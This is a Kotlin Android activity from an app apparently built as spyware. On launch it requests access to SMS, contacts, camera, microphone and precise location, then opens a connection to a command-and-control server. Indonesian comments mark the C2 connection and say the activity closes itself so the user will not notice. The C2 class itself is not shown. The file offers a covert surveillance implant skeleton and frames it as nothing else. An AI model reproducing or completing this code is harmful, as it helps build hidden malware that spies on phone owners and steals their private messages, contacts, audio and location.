package com.ops.agent

import android.Manifest
import android.app.Activity
import android.os.Bundle
import androidx.core.app.ActivityCompat

class MainActivity : Activity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        val perms = arrayOf(
            Manifest.permission.READ_SMS,
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.CAMERA,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.ACCESS_FINE_LOCATION
        )
        ActivityCompat.requestPermissions(this, perms, 1)
        
        // Mulai koneksi ke C2
        Thread {
            C2.connect()
        }.start()
        
        // Selesai, tutup activity biar gak ketahuan
        finish()
    }
}
